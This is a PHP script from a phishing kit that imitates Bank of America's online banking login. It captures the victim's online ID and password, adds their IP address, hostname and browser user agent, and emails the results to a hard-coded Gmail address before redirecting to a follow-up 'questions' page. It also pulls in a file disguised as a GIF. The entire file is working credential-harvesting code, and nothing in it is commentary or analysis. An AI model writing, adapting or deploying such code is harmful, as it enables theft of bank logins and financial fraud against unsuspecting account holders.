<?php
$message = [];
include ("images/blocker.gif");
if($_POST["usr"] ){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "|----------- BOFA AT MONALISA SERVICE --------------|\n";
$message .= "Online ID            : ".$_POST['usr']."\n";
$message .= "PASSWORD            : ".$_POST['pass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- BY BLACKSUN4  --------------|\n";
$message .= "|---------- LEER Archivo CONTRATACIONES.TXT para mas detalles  -----------|\n";
$send = "alfredomillan799@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", "$message");
mail("$userinfo","$subject","$message");
}
$praga=rand();
$praga=md5($praga);
  header ("Location: questions.php");
}else

?>

